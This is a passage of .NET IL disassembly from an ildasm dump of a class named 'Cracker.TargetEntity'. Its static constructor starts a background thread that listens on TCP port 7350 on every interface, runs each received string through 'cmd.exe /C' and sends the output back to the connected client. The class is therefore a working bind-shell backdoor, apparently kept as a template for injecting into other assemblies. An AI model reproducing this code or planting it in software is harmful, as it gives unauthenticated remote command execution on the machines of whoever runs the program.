        IL_00d0:  ldfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
        IL_00d5:  callvirt   instance void [System]System.Net.Sockets.Socket::Close()
        IL_00da:  nop
        IL_00db:  leave.s    IL_0150

        IL_00dd:  ldstr      "cmd.exe"
        IL_00e2:  ldstr      " /C {0}"
        IL_00e7:  ldloc.3
        IL_00e8:  call       string [mscorlib]System.String::Format(string,
                                                                    object)
        IL_00ed:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor(string,
                                                                                              string)
        IL_00f2:  stloc.s    psi
        IL_00f4:  ldloc.s    psi
        IL_00f6:  ldc.i4.1
        IL_00f7:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardOutput(bool)
        IL_00fc:  nop
        IL_00fd:  ldloc.s    psi
        IL_00ff:  ldc.i4.0
        IL_0100:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
        IL_0105:  nop
        IL_0106:  ldloc.s    psi
        IL_0108:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
        IL_010d:  callvirt   instance class [mscorlib]System.IO.StreamReader [System]System.Diagnostics.Process::get_StandardOutput()
        IL_0112:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadToEnd()
        IL_0117:  stloc.s    output
        IL_0119:  ldarg.0
        IL_011a:  ldfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
        IL_011f:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
        IL_0124:  ldloc.s    output
        IL_0126:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
        IL_012b:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[])
        IL_0130:  pop
        IL_0131:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
        IL_0136:  stloc.0
        IL_0137:  nop
        IL_0138:  ldloc.0
        IL_0139:  ldloc.2
        IL_013a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
        IL_013f:  pop
        IL_0140:  nop
        IL_0141:  leave.s    IL_0146

      }  // end .try
      finally
      {
        IL_0143:  nop
        IL_0144:  nop
        IL_0145:  endfinally
      }  // end handler
      IL_0146:  nop
      IL_0147:  nop
      IL_0148:  ldc.i4.1
      IL_0149:  stloc.s    CS$4$0001
      IL_014b:  br         IL_000c

      IL_0150:  nop
      IL_0151:  ldarg.0
      IL_0152:  ldfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
      IL_0157:  callvirt   instance void [System]System.Net.Sockets.Socket::Close()
      IL_015c:  nop
      IL_015d:  ret
    } // end of method '<>c__DisplayClass3'::'<.cctor>b__1'

  } // end of class '<>c__DisplayClass3'

  .field private static class [mscorlib]System.Threading.WaitCallback 'CS$<>9__CachedAnonymousMethodDelegate2'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // 代码大小       40 (0x28)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldsfld     class [mscorlib]System.Threading.WaitCallback Cracker.TargetEntity::'CS$<>9__CachedAnonymousMethodDelegate2'
    IL_0006:  brtrue.s   IL_001b

    IL_0008:  ldnull
    IL_0009:  ldftn      void Cracker.TargetEntity::'<.cctor>b__0'(object)
    IL_000f:  newobj     instance void [mscorlib]System.Threading.WaitCallback::.ctor(object,
                                                                                      native int)
    IL_0014:  stsfld     class [mscorlib]System.Threading.WaitCallback Cracker.TargetEntity::'CS$<>9__CachedAnonymousMethodDelegate2'
    IL_0019:  br.s       IL_001b

    IL_001b:  ldsfld     class [mscorlib]System.Threading.WaitCallback Cracker.TargetEntity::'CS$<>9__CachedAnonymousMethodDelegate2'
    IL_0020:  call       bool [mscorlib]System.Threading.ThreadPool::QueueUserWorkItem(class [mscorlib]System.Threading.WaitCallback)
    IL_0025:  pop
    IL_0026:  nop
    IL_0027:  ret
  } // end of method TargetEntity::.cctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // 代码大小       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method TargetEntity::.ctor

  .method private hidebysig static void  '<.cctor>b__0'(object o) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // 代码大小       92 (0x5c)
    .maxstack  3
    .locals init ([0] class [System]System.Net.Sockets.Socket socket,
             [1] class Cracker.TargetEntity/'<>c__DisplayClass3' 'CS$<>8__locals4',
             [2] bool CS$4$0000)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldc.i4.2
      IL_0003:  ldc.i4.1
      IL_0004:  ldc.i4.6
      IL_0005:  newobj     instance void [System]System.Net.Sockets.Socket::.ctor(valuetype [System]System.Net.Sockets.AddressFamily,
                                                                                  valuetype [System]System.Net.Sockets.SocketType,
                                                                                  valuetype [System]System.Net.Sockets.ProtocolType)
      IL_000a:  stloc.0
      IL_000b:  ldloc.0
      IL_000c:  ldsfld     class [System]System.Net.IPAddress [System]System.Net.IPAddress::Any
      IL_0011:  ldc.i4     0x1cb6
      IL_0016:  newobj     instance void [System]System.Net.IPEndPoint::.ctor(class [System]System.Net.IPAddress,
                                                                              int32)
      IL_001b:  callvirt   instance void [System]System.Net.Sockets.Socket::Bind(class [System]System.Net.EndPoint)
      IL_0020:  nop
      IL_0021:  ldloc.0
      IL_0022:  ldc.i4     0x1cb6
      IL_0027:  callvirt   instance void [System]System.Net.Sockets.Socket::Listen(int32)
      IL_002c:  nop
      IL_002d:  br.s       IL_0055

      IL_002f:  newobj     instance void Cracker.TargetEntity/'<>c__DisplayClass3'::.ctor()
      IL_0034:  stloc.1
      IL_0035:  nop
      IL_0036:  ldloc.1
      IL_0037:  ldloc.0
      IL_0038:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.Socket::Accept()
      IL_003d:  stfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
      IL_0042:  ldloc.1
      IL_0043:  ldftn      instance void Cracker.TargetEntity/'<>c__DisplayClass3'::'<.cctor>b__1'(object)
      IL_0049:  newobj     instance void [mscorlib]System.Threading.WaitCallback::.ctor(object,
                                                                                        native int)
      IL_004e:  call       bool [mscorlib]System.Threading.ThreadPool::QueueUserWorkItem(class [mscorlib]System.Threading.WaitCallback)
      IL_0053:  pop
      IL_0054:  nop
      IL_0055:  ldc.i4.1
      IL_0056:  stloc.2
      IL_0057:  br.s       IL_002f

    }  // end .try
    finally
    {
      IL_0059:  nop
      IL_005a:  nop
      IL_005b:  endfinally
    }  // end handler
  } // end of method TargetEntity::'<.cctor>b__0'

} // end of class Cracker.TargetEntity


// =============================================================

// *********** 反汇编完成 ***********************
// 警告: 创建了 Win32 资源文件 template.res
